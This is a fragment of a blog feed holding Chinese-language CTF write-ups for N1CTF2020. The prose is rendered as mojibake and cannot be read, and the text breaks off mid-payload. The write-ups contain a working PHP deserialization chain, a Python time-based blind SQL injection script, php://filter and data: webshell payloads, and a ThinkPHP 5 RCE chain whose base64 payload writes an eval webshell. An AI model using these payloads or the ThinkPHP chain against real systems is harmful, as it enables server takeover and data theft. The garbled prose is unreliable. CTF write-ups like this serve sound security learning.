æ‰€ä»¥éå¸¸å¯æƒœã€‚åˆ©ç”¨é“¾æƒ³å¥½åç»“æœå»èµ¶é£æœºé”™è¿‡äº†æ¯”èµ›ä¸­è§£å‡ºçš„æœºä¼šã€‚ä¸è¿‡æ€è·¯è¿˜æ˜¯å¾ˆè€ƒéªŒäººçš„ã€‚é¢˜ç›®è´¨é‡å¾ˆé«˜ã€‚å°±æ˜¯æœ¬åœ°ç¯å¢ƒæœ‰ç‚¹ç£¨äººã€‚ã€‚ã€‚</p><p>æœ€ååˆ†äº«ä¸‹æˆ‘æŒ‰ç…§æºç æ­å¥½çš„dockerç¯å¢ƒã€‚<br><a href="https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy" target="_blank" rel="noopener">https://github.com/baiyecha404/CTFWEBchallenge/tree/master/bytectf2020/easyscrapy</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
            <tag> wp </tag>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>N1CTF2020</title>
      <link href="2020/10/19/N1CTF2020/"/>
      <url>2020/10/19/N1CTF2020/</url>
      
        <content type="html"><![CDATA[<p>  N1CTFçš„é¢˜ç›®è´¨é‡æ¯‹åº¸ç½®ç–‘,å¯æƒœè‡ªå·±èƒ½åŠ›ä¸è¶³ã€‚é™¤äº†ç­¾åˆ°è¿˜çœ‹äº†easytp5,filters,è¿˜æœ‰æ¸—é€ç³»åˆ—çš„Victim.åŸºæœ¬éƒ½æ²¡æ€è·¯æˆ–è€…æ€è·¯è·‘åäº†â€¦â€¦æŠ“ç´§å¤ç°ä¸‹æ¥å­¦ä¹ å­¦ä¹ ã€‚</p><a id="more"></a><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>è¿™é¢˜æ‹¿çš„äºŒè¡€éš¾å—æ­»äº†,é”™å¤±ç©ºæŒ‡é’ˆé‚€è¯·ç â€¦â€¦(è¥¿æ¹–uploadä¹Ÿæ˜¯äºŒè¡€,è‡ªå·±äººæœ€è¿‘ä¹Ÿæœ‰ç‚¹æ°´é€†ï¼Œéš¾é“è¿™å°±æ˜¯2çš„è¯…å’’ä¹ˆï¼Ÿ:(  )</p><p>source</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip =$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"********"</span>,<span class="string">"n1ctf_websign"</span>);</span><br><span class="line">        $sqlquery=sprintf(<span class="string">"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')"</span>,<span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]),time());</span><br><span class="line">        <span class="keyword">if</span>(!mysqli_query($con,$sqlquery))&#123;</span><br><span class="line">            <span class="keyword">return</span> mysqli_error($con);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"your ip looks ok!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">"key****************"</span>))&#123;</span><br><span class="line">    readfile(<span class="string">'/flag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">"n1ctf"</span>)!==<span class="keyword">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"welcome to n1ctf2020"</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"noip"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))&#123;</span><br><span class="line">    $input = $_GET[<span class="string">'input'</span>];</span><br><span class="line">unserialize($input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶æˆ‘ä»¬éœ€è¦getflagçš„è¯,éœ€è¦æ‹¿åˆ°æ•°æ®åº“é‡Œçš„key.è€Œkeyéœ€è¦é€šè¿‡sqlæ³¨å…¥è·å–ã€‚è¿™é‡Œå”¯ä¸€å­˜åœ¨æ³¨å…¥çš„åœ°æ–¹åœ¨ipçš„<code>__toString</code>ä¸­ã€‚æ•…é€šè¿‡ååºåˆ—åŒ–è§¦å‘<code>__toString</code>å³å¯ã€‚è®¾ç½®flagç±»çš„<code>ip</code>ä¸ºipç±»å°±å¯ä»¥åœ¨<code>stristr</code>å¤„è§¦å‘äº†ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯é»‘ç›’wafä¸‹è¿›è¡Œæ³¨å…¥çš„äº‹äº†ã€‚<br>æˆ‘çš„æ€è·¯æ¯”è¾ƒç›´æ¥ã€‚ç›´æ¥æ—¶é—´ç›²æ³¨ã€‚å½“ç„¶è¿™é‡Œç¨å¾®æ„é€ ä¸‹è¿›è¡ŒæŠ¥é”™ç›²æ³¨ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚(å› ä¸º<code>__toString</code>çš„è¿”å›å€¼ä¼šä¸n1ctfæ¯”è¾ƒ,è€Œ<code>__toString</code>è¿”å›å€¼æœ‰mysqlæŠ¥é”™ä¸â€your ip looks ok!â€ä¸¤ç§ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ„é€ æŠ¥é”™ä»è€Œäº§ç”Ÿå¸ƒå°”å€¼æ¥ç›²æ³¨äº†)</p><p>æ—¶é—´ç›²æ³¨çš„è¯,ç”±äºbanäº†ä¸å°‘å…³é”®è¯,æ‰€ä»¥æˆ‘æ˜¯ç°å­¦çš„æ–°æ–¹æ³•<br><code>select rpad(&#39;a&#39;,2999999,&#39;a&#39;) regexp concat(repeat(&#39;(a.*)+&#39;,30),&#39;b&#39;)</code></p><p>å…¶å®æŒºåƒ jsé‡Œçš„æ­£åˆ™ç›²æ³¨çš„ã€‚å½“ç„¶å…¶å®ä»å…¶ä»–å‡ ç§æ—¶é—´ç›²æ³¨æ–¹æ³•å¦‚heavy queryå°±å¯ä»¥æ¨å‡ºè¿™ç§ä»¤æœåŠ¡ç«¯äº§ç”Ÿè´Ÿè·çš„æ–¹æ³•å¿…ç„¶å¯è¡Œ233ã€‚<br>ç„¶åé¢˜ç›®åªwafæ‰äº†rpad,rpadä¸èƒ½ç”¨çš„è¯æ”¹æˆlpadå°±å¥½äº†:)</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://101.32.205.189/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getflag</span><span class="params">(payload)</span>:</span></span><br><span class="line">    r = requests.get(url, params=&#123;<span class="string">'input'</span>: payload&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line"><span class="comment">#key n1ctf20205bf75ab0a30dfc0c</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">()</span>:</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="comment">#'X-Forwarded-For': "1'^(if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),"+str(i)+",1))=" + str(ord(j)) + ",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1"</span></span><br><span class="line">                <span class="comment">#'X-Forwarded-For': "1'^(if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='n1key'),"+str(i)+",1))=" + str(j) + ",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1"</span></span><br><span class="line">                <span class="string">'X-Forwarded-For'</span>: <span class="string">"1'^(if(ascii(substr((select `2` from (select 1,2 union select * from n1key)a limit 1,1),"</span>+str(i)+<span class="string">",1))="</span> + str(ord(j)) + <span class="string">",(select lpad('a',2999999,'a') regexp concat(repeat('(a.*)+',30),'b')),0))^'1"</span></span><br><span class="line">                <span class="comment"># select `2` from (select 1,2 union select * from n1key) a limit 1,1</span></span><br><span class="line">            &#125;</span><br><span class="line">            t = time.time()</span><br><span class="line">            r = requests.get(url, params=&#123;<span class="string">'input'</span>: payload&#125;, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'hack'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                print(<span class="string">'banwords'</span>)</span><br><span class="line">            <span class="keyword">if</span> time.time() - t &gt; <span class="number">2.5</span>:</span><br><span class="line">                res +=j</span><br><span class="line">                print(res)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment">#sqli('O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";N;&#125;s:5:"check";N;&#125;')</span></span><br><span class="line">    getflag(<span class="string">'O:4:"flag":2:&#123;s:2:"ip";N;s:5:"check";s:25:"n1ctf20205bf75ab0a30dfc0c";&#125;'</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæµªè´¹æˆ‘æ—¶é—´æœ€ä¹…çš„å°±æ˜¯æœ€åä¸€æ­¥<code>select key from n1key</code>,å¯¼è‡´é”™å¤±ä¸€è¡€ã€‚è¯•äº†å¥½ä¹…è¿˜æ¢äº†ä¸€ç§æ³¨æ³•æ‰æ€€ç–‘æ˜¯ä»–æœåŠ¡ç«¯wafäº†è¿™ä¸ªè¯­å¥ã€‚ç„¶åå°è¯•æ€§çš„æ”¹æˆæ— åˆ—åæ³¨å…¥<code>select `2` from (select 1,2 union select * from n1key)a limit 1,1</code>å°±æˆäº† orz. æ‰€ä»¥å¯èƒ½è¿˜æ˜¯è‡ªå·±å¤ªèœæ‰é”™å¤±è‰¯æœºå§ã€‚</p><h2 id="filters"><a href="#filters" class="headerlink" title="filters"></a>filters</h2><p>source</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">isset</span>($_POST[<span class="string">'filters'</span>])?print_r(<span class="string">"show me your filters!"</span>): <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</span><br><span class="line">$input = explode(<span class="string">"/"</span>,$_POST[<span class="string">'filters'</span>]);</span><br><span class="line">$source_file = <span class="string">"/var/tmp/"</span>.sha1($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">$file_contents = [];</span><br><span class="line"><span class="keyword">foreach</span>($input <span class="keyword">as</span> $filter)&#123;</span><br><span class="line">    array_push($file_contents, file_get_contents(<span class="string">"php://filter/"</span>.$filter.<span class="string">"/resource=/usr/bin/php"</span>));</span><br><span class="line">&#125;</span><br><span class="line">shuffle($file_contents);</span><br><span class="line">file_put_contents($source_file, $file_contents);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">require_once</span> $source_file;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(\Throwable $e)&#123;</span><br><span class="line">    pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unlink($source_file);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é¢˜è‡ªå·±å°±æ²¡åšå‡ºæ¥äº†ã€‚ä¸è¿‡å¯ä»¥åˆ†äº«ä¸‹æˆ‘å½“æ—¶çš„æ€è·¯,æˆ‘æ„Ÿè§‰åº”è¯¥æ˜¯æ§åˆ¶filterè¿‡æ»¤å™¨å¤šå±‚ç»„åˆfuzzæ¥æ„é€ ä»»æ„å­—ç¬¦ã€‚ä¹Ÿå°±æ˜¯è¯´å‰ææ˜¯åœ¨resourceå§‹ç»ˆä¸º<code>/usr/bin/php</code>ä¸‹çš„ã€‚</p><p>å‡å¦‚è¿™é‡Œä¸æ˜¯file_get_contentsçš„è¯å…¶å®å¾ˆç®€å•,å› ä¸ºè¿‡æ»¤å™¨çš„å†…å®¹å¯ä»¥ä½¿ç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„,æ‰€ä»¥åƒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13|&lt;?cuc @riny($_CBFG[Dsgz])?&gt;&#x2F;resource&#x3D;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSb[cy)]?; &gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨file_put_contents()æ—¶å†™å…¥æŒ‡å®šæ–‡ä»¶ã€‚å¹¶ä¸”warningä¸å½±å“å†™å…¥ã€‚ä¸è¿‡å‡ºé¢˜äººè‚¯å®šçŸ¥é“è¿™ç‚¹æ‰€ä»¥æ˜¯å…ˆfile_get_contentså†file_put_contentsã€‚å¹¶ä¸”æ–‡ä»¶åçš„å‚æ•°ä¹Ÿä¸å¯æ§ï¼Œæ‰€ä»¥å°±ä¸çŸ¥é“æ˜¯ä»€ä¹ˆå¥‡æ·«æŠ€å·§äº†ã€‚</p><p>ps: çœ‹åˆ°å®˜æ–¹wpçš„ç¡®æ˜¯fuzzæ„é€ å­—ç¬¦ã€‚æœ‰ç‚¹orange çš„ oneline php challengeé‚£å‘³äº†ã€‚</p><p>çœ‹åˆ°SuperGusserçš„wpåæ„Ÿè§‰ä»–ä»¬çš„æ€è·¯æ˜¯çœŸçš„ç®€å•ã€‚ã€‚ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filters&#x3D;resource&#x3D;data:,&lt;?php%20system(&#39;ls&#39;);?&gt;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æœ€è´¨æœ´çš„dataåè®®å†™å…¥,ä¸ç”¨å¸¦ä¸Štext,plain,base64ä¹‹ç±»çš„ã€‚é‚£ä¹ˆåé¢çš„å†…å®¹éƒ½è¢«å½“åšdataçš„å†…å®¹äº†ã€‚æ‰€ä»¥æ ¹æœ¬ä¸ç”¨ç®¡<code>/</code>äº†</p><h2 id="easytp5"><a href="#easytp5" class="headerlink" title="easytp5"></a>easytp5</h2><p>smileå¤§å¸ˆå‚…çš„é¢˜å¿…ç„¶å°‘ä¸äº†thinkphp ?<br>è¿™é¢˜æˆ‘æ€è·¯æœ‰ç‚¹èµ°åäº†ï¼Œå…¶å®è¦æ˜¯æŒ‰ç…§åŸæ¥æš‘å‡è·Ÿè¿‡çš„tp5.0 çš„rceæ€è·¯åº”è¯¥ä¼šé¡ºåˆ©å¤šäº†ã€‚</p><p>ä»¥ä¸‹å†…å®¹å¯ä»¥åœ¨ç›´æ¥å­¦ä¹ tpæ¼æ´çš„ç¬”è®°æ‰¾åˆ°<br>é¦–å…ˆæ˜¯ä¸€ä¸ªtp5 rceçš„é€šç”¨ç‚¹ã€‚é‚£å°±æ˜¯å¯ä»¥é€šè¿‡æ§åˆ¶å™¨æ¥è¦†ç›–å€¼ã€‚<br>åœ¨Request.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¸å‹çš„å°±æ˜¯å¯ä»¥è°ƒç”¨Requestä»»æ„æ–¹æ³•å¹¶ä»¥<code>$_POST</code>ä¸ºå‚æ•°ã€‚<br>ç„¶åè¿›<code>__construct</code>å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($options = [])</span></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($options <span class="keyword">as</span> $name =&gt; $item) &#123;</span><br><span class="line">            <span class="keyword">if</span> (property_exists(<span class="keyword">$this</span>, $name)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$name = $item;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;filter)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filter = Config::get(<span class="string">'default_filter'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ªä»»æ„å‚æ•°è¦†ç›–ã€‚æ‰€ä»¥è¿˜æ˜¯åˆ©ç”¨è¿™ä¸ªç±»çš„æ‰€æœ‰å¯æ§å‚æ•°æ¥æ‰¾gadgetæ‰“ã€‚<br>è¿™é‡Œç»§ç»­ä¸‹æ–­ç‚¹ä¸€è·¯è·Ÿå‘ç°ä¼šæ ¹æ®app_debugçš„å€¼å‰å¾€å½“å‰ç±»ä¸‹paramæ–¹æ³•ã€‚<br>è€Œè¿™ä¸ªæ–¹æ³•å…¨éƒ½èµ°inputæ–¹æ³•ã€‚ä¹Ÿå°±æ˜¯éƒ½ä¼šè°ƒç”¨äº†call_user_funcã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input</span></span><br><span class="line"><span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">    array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">    reset($data);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//filterValue</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šéƒ¨åˆ†è·Ÿtp5çš„rceæ€è·¯å®Œå…¨ä¸€è‡´ã€‚åªä¸è¿‡é¢˜ç›®è®¾ç½®äº†disable_function,ä»¥åŠç¦ç”¨äº†ä¸€äº›å•å‚æ•°å‡½æ•°ã€‚å¯¼è‡´å¤§éƒ¨åˆ†payloadéƒ½ä¸å¯è¡Œã€‚</p><p>é‚£ä¹ˆæ¯”è¾ƒé‡è¦çš„å°±æ˜¯æ‰¾gadgetäº†ã€‚<br>æˆ‘ä»¬å¯ä»¥æ§åˆ¶filter,ç„¶åè¿›è¡Œä»»æ„æ–¹æ³•çš„å•å‚æ•°rce.ä¸è¿‡ç”±äºforå¾ªç¯å¾ªç¯è°ƒç”¨<code>$value</code>.æ‰€ä»¥å¯ä»¥æ­é…gadgetè¿›è¡Œrce.<br>è¿™é‡Œå¯ä»¥æ‰¾æ¶æ„å‡½æ•°æ‰¾åˆ°eval<br><code>thinkphp\library\think\view\driver\Php.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">($content, $data = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'content'</span>])) &#123;</span><br><span class="line">        $__content__ = $content;</span><br><span class="line">        extract($data, EXTR_OVERWRITE);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . $__content__);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        extract($data, EXTR_OVERWRITE);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'?&gt;'</span> . $content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿™é‡Œçš„ç›´æ¥è°ƒç”¨ä¼šæŠ¥é”™,æ‰€ä»¥çœ‹åˆ°SuperGuesserçš„wpé‡Œæåˆ°äº†è®¾ç½®set_error_handler ä¸ºä»»æ„å…¶ä»–å‡½æ•°æ¥é¿å…tpçš„é»˜è®¤é”™è¯¯å¤„ç†ã€‚æ­¤å¤„æ˜¯<code>implode</code>.é‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ç»§ç»­äº†ã€‚<br>å…³äºfilterçš„è°ƒç”¨ã€‚<br><img src="/2020/10/19/N1CTF2020/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å°±æ˜¯è¿™å››æ¬¡è°ƒç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.set_error_handler &quot;implode&quot;</span><br><span class="line">2.self::path  base64-payload </span><br><span class="line">3.base64_decode  base64-payload </span><br><span class="line">4.\think\view\driver\Php::Display payload</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode&quot;</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">path&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ2J5Yy5waHAnLCc8P3BocCBldmFsKCRfUkVRVUVTVFtieWNdKTs&#x2F;PicpOyA&#x2F;P</span><br><span 